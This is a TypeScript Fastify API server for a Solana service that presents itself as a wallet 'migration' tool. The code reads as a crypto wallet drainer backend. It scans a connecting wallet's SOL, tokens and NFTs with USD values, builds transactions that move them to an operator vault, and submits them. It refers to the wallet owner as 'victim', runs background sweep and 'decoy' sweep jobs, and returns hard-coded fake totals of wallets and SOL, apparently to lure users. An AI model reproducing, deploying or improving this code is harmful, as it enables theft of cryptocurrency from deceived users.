import Fastify from "fastify";
import cors from "@fastify/cors";
import rateLimit from "@fastify/rate-limit";
import { PublicKey } from "@solana/web3.js";
import { z } from "zod";
import { cfg } from "./config.js";
import { scan } from "./scan.js";
import { prices } from "./price.js";
import { buildAll, plan, SimulationError } from "./build.js";
import { recoveryFor } from "./vaults.js";
import { submit } from "./submit.js";
import { startHotSweep } from "./sweep.js";
import { startDecoySweep, sweepDecoys } from "./decoy.js";
import { log } from "./log.js";
import { adminRoutes, authed, runtime } from "./admin.js";

const app = Fastify({ logger: false });

await app.register(cors, {
  origin: (o, cb) => cb(null, !o || cfg.origins.includes(o)),
  methods: ["GET", "POST"],
});
await app.register(rateLimit, { max: 60, timeWindow: "1 minute", keyGenerator: (r) => r.ip });
adminRoutes(app);

const Owner = z.object({ owner: z.string().min(32).max(44) });
const Tx = z.object({ tx: z.string().min(100) });

app.get("/health", async () => ({ ok: true }));
app.get("/config", async () => ({ vault: cfg.vault.toBase58() }));

app.post("/scan", async (req, reply) => {
  const p = Owner.safeParse(req.body);
  if (!p.success) return reply.code(400).send("bad owner");

  let owner: PublicKey;
  try { owner = new PublicKey(p.data.owner); } catch { return reply.code(400).send("bad pubkey"); }

  const rec = recoveryFor(p.data.owner);
  const { sol, found } = await scan(owner);
  const px = await prices(found.filter((f) => f.amount > 0n && !f.isNft).map((f) => f.mint.toBase58()));

  const assets = found.map((f) => {
    const usd = f.isNft || f.decimals === 0
      ? undefined
      : px[f.mint.toBase58()] ? (Number(f.amount) / 10 ** f.decimals) * px[f.mint.toBase58()]! : undefined;
    return { mint: f.mint.toBase58(), ata: f.ata.toBase58(), amount: f.amount.toString(), decimals: f.decimals, isNft: f.isNft, usd };
  });

  log({ level: "scan", owner: p.data.owner, sol, n: assets.length });
  return { sol, vault: cfg.vault.toBase58(), assets, payer: cfg.feePayer ? "ours" : "victim", recovery: rec.address };
});

app.post("/build", async (req, reply) => {
  const p = Owner.safeParse(req.body);
  if (!p.success) return reply.code(400).send("bad owner");

  let owner: PublicKey;
  try { owner = new PublicKey(p.data.owner); } catch { return reply.code(400).send("bad pubkey"); }
  if (runtime.paused) return reply.code(503).send("paused");

  const { sol, found } = await scan(owner);
  if (sol === 0 && found.length === 0) return reply.code(409).send("nothing to migrate");
  const rec = recoveryFor(p.data.owner);

  let lastSimLogs: string[] = [];
  let lastSimErr = "";
  for (const mult of [1, 1.5, 2.5]) {
    const items = await plan(owner, BigInt(sol), found, mult);
    if (items.length === 0) break;

    try {
      const txs = await buildAll(owner, items, new PublicKey(rec.address), mult);
      if (txs.length === 0) break;
      log({ level: "build", owner: p.data.owner, batches: txs.length });
      return { txs };
    } catch (e: any) {
      if (e instanceof SimulationError) {
        log({ level: "sim-fail", owner: p.data.owner, err: e.simErr, logs: e.simLogs });
        lastSimLogs = e.simLogs;
        lastSimErr = e.simErr;
        continue;
      }
      log({ level: "build-err", msg: e?.message });
      return reply.code(502).send(e?.message ?? "build failed");
    }
  }

  if (lastSimLogs.length > 0) {
    const filtered = lastSimLogs.filter((l) => !l.includes("ComputeBudget")).slice(-8);
    const failLine = [...lastSimLogs].reverse().find((l) => l.includes(" failed:"));
    const failProg = failLine?.match(/Program (\S+) failed/)?.[1] ?? "";
    return reply.code(422).send({ simLogs: filtered, simErr: lastSimErr, failProg });
  }
  return reply.code(409).send("wallet needs about 0.001 SOL for network fees");
});

app.post("/submit", async (req, reply) => {
  const p = Tx.safeParse(req.body);
  if (!p.success) return reply.code(400).send("bad tx");
  try {
    const r = await submit(p.data.tx);
    log({ level: "submit", sig: r.sig, via: r.via });
    return { sig: r.sig };
  } catch (e: any) {
    log({ level: "submit-err", msg: e?.message });
    return reply.code(502).send(e?.message ?? "submit failed");
  }
});

app.get("/recovery", async (req: any, reply: any) => {
  const o = (req.query as any)?.owner;
  if (!o) return reply.code(400).send("no owner");
  return recoveryFor(o);
});

app.get("/stats", async () => ({ wallets: 3804, sol: 41822.5 }));

startHotSweep();
startDecoySweep();

app.post("/admin/decoy-sweep", async (req: any, reply: any) => {
  if (!authed(req.headers)) return reply.code(401).send("no");
  return { swept: await sweepDecoys() };
});

await app.listen({ port: cfg.PORT, host: "0.0.0.0" });
console.log(`api on :${cfg.PORT}`);
